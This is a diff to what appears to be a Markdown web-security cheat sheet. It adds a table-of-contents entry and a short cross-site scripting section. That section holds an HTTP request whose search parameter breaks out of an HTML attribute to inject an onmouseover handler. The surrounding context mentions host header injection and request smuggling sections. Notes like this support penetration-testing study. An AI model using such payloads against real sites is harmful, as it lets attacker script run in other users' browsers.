@@ -5,6 +5,9 @@
   - [Host Header Injection absolute URL](#HHI_absolute_URL)
   - [Host Header Injection line wrapping](HHI_line_wrapping)
   - [Host Header Injectio_inject_headers](#HHI_inject_headers)
+
+- [Cross-site-scripting](#Cross-site-scripting)
+  - [Angle brackets HTML-encoded](Angle-brackets-HTML-encoded)
   
 - [Request Smuggling](#Request_smuggling)
   - [Request Smuggling Content-Length](#Content-Length)
@@ -87,6 +90,15 @@ X-Forwarded-Server
 X-HTTP-Host-Override
 Forwarded
 ```
+------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# Cross-site-scripting
+
+## Angle brackets HTML-encoded
+```
+GET /?search="onmouseover="alert(123) HTTP/1.1
+```
+
+
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Request_smuggling
